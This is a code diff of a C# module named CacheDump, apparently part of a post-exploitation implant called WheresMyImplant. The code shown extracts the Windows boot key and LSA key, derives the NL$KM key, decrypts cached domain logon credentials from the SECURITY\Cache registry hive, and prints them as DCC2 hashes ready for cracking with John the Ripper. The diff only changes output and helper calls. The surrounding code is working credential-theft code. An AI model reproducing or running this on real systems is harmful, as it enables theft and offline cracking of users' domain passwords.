@@ -1,14 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.IO;
 using System.Linq;
-using System.Security.Principal;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
 
-using Unmanaged;
+using MonkeyWorks;
 
 namespace WheresMyImplant
 {
@@ -83,14 +80,14 @@ namespace WheresMyImplant
         internal CacheDump()
         {
             String logonCount = (String)Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "CachedLogonsCount");
-            WriteOutputNeutral(String.Format("{0} Cached Logons Set", logonCount));
+            Console.WriteLine("[*] {0} Cached Logons Set", logonCount);
 
             Byte[] bootKey = LSASecrets.GetBootKey();
-            WriteOutputGood("BootKey : " + BitConverter.ToString(bootKey).Replace("-", ""));
+            Console.WriteLine("[+] BootKey : " + BitConverter.ToString(bootKey).Replace("-", ""));
             Byte[] lsaKey = LSASecrets.GetLsaKey(bootKey);
-            WriteOutputGood("LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
+            Console.WriteLine("[+] LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
             Byte[] nlkm = GetNlkm(lsaKey);
-            WriteOutputGood("LSA Key : " + BitConverter.ToString(nlkm).Replace("-", ""));
+            Console.WriteLine("[+] LSA Key : " + BitConverter.ToString(nlkm).Replace("-", ""));
             GetCache(nlkm);
         }
 
@@ -126,7 +123,7 @@ namespace WheresMyImplant
                 iterationCount *= 1024;
             }
 
-            WriteOutput(String.Format("{0}\\{1}:$DCC2${2}#{1}#{3}::", domain, username, iterationCount, hash));
+            Console.WriteLine("{0}\\{1}:$DCC2${2}#{1}#{3}::", domain, username, iterationCount, hash);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -135,7 +132,7 @@ namespace WheresMyImplant
         private void GetCache(Byte[] nlkm)
         {
             String[] cacheValues = Registry.LocalMachine.OpenSubKey(@"SECURITY\Cache").GetValueNames();
-            WriteOutputGood("[+] JtR format: ");
+            Console.WriteLine("[+] JtR format: ");
             foreach (String value in cacheValues)
             {
                 if (value == @"NL$Control")
@@ -163,7 +160,7 @@ namespace WheresMyImplant
                     {
                         padding[i] = (byte)'\0';
                     }
-                    encData = Misc.Combine(encData, padding);
+                    encData = Combine.combine(encData, padding);
                 }
 
                 ////////////////////////////////////////////////////////////////////////////////
@@ -178,7 +175,7 @@ namespace WheresMyImplant
                     ICryptoTransform decryptor = aes.CreateDecryptor();
                     for (Int32 i = 0; i < encData.Length; i += 16)
                     { 
-                        aesDecrypted = Misc.Combine(aesDecrypted, decryptor.TransformFinalBlock(encData, i, 16));
+                        aesDecrypted = Combine.combine(aesDecrypted, decryptor.TransformFinalBlock(encData, i, 16));
                     }
                 }
                 ParseDecryptedData(ref cacheData, ref aesDecrypted);
